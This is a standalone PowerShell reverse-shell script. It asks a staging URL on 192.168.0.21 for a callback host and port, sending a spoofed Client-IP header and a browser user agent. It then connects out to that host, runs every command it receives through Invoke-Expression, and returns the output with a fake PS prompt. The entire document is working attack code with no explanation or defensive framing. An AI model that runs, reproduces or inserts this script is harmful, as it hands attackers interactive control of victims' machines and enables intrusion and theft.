$HTTP = (Invoke-WebRequest http://192.168.0.21/payload.php?session -Headers @{'Client-IP' = '192.168.0.29'} -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00').Content
$client = New-Object System.Net.Sockets.TCPClient($HTTP.split(',')[0],$HTTP.split(',')[1]);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
